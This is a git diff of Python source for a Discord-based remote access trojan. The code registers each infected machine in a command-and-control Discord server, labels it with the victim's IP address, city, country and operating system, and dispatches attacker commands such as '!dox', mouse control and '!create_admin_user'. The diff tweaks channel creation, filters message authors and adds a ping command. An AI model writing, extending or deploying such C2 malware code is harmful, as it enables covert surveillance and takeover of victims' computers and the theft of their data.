@@ -14,6 +14,7 @@ from features.screenRecord import *
 from features.windows import *
 import json
 import re
+import asyncio
 
 
 __DISCORD_TARGETS_CHANNEL_NAME = "targets"
@@ -21,17 +22,15 @@ __DISCORD_TARGETS_CHANNEL_NAME = "targets"
 
 def main():
     load_dotenv() #take enviroment variables from file .env
-    bot = commands.Bot(command_prefix="!")
     ip = get_ip()
     identifier = generate_uuid()
+    country, city = get_location(ip)
+    threads = []
 
     # Guild, Bot Token input
     channel_id = int(os.environ.get("DISCORD_CHANNEL_ID")) # should be in int type!
     token = os.environ.get("DISCORD_TOKEN") # should be in string type!
-
-    country, city = get_location(ip)
-    
-    threads = []
+    bot = commands.Bot(command_prefix="!")
 
     @bot.event
     async def on_ready():  #This func will start when the bot is ready to use
@@ -44,16 +43,17 @@ def main():
         targets_identifiers = list(map(lambda target: json.loads(target)['identifier'], targets))
 
         if identifier not in targets_identifiers:
-            channel_name = await guild.create_text_channel(identifier)
-            await targets_channel.send(json.dumps({'identifier': identifier, 'channel_id': channel_name.id}))
+            channel_name = await guild.create_text_channel(identifier, topic=f"IP: {ip} | COUTRY: {country} | CITY: {city} | OS: {platform.platform()}")
             print(f"Created new channel: {channel_name}")
             channel_id = discord.utils.get(bot.get_all_channels(), name=identifier)
             c2 = bot.get_channel(channel_id.id)
-            await c2.edit(topic=f"IP: {ip} | COUTRY: {country} | CITY: {city} | OS: {platform.platform()}")
 
     # this blob is for helping the website backend
     @bot.event
     async def on_message(message):
+        if not message.author.bot:
+            return
+
         if re.match(r'!dox',message.content):
             await dox(await bot.get_context(message))
         elif re.match(r'!mouse \d+',message.content):
@@ -79,7 +79,16 @@ def main():
             await create_admin_user(await bot.get_context(message))
         elif re.match(r'!help',message.content):
             await help(await bot.get_context(message))
+        elif re.match(r'!ping',message.content):
+            await ping(await bot.get_context(message))
 
+
+    @bot.command()
+    async def ping(ctx):
+        if ctx.channel.name != generate_uuid():
+            return
+
+        await ctx.reply('pong!')
 
     @bot.command()
     async def dox(ctx):
